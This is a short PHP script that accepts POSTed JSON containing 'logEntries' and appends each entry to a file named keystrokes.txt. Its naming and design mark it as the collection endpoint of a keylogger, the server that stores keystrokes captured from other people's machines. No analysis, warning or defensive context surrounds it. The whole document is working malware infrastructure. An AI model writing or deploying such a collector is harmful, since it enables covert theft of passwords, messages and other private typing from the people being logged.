<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = file_get_contents("php://input");
    $data = json_decode($input, true);

    if (isset($data['logEntries'])) {
        $logEntries = $data['logEntries'];
        $file = 'keystrokes.txt';

        foreach ($logEntries as $logEntry) {
            file_put_contents($file, $logEntry . PHP_EOL, FILE_APPEND | LOCK_EX);
        }
        echo 'Log entries recorded';
    } else {
        echo 'No log entries received';
    }
} else {
    echo 'Invalid request method';
}
?>
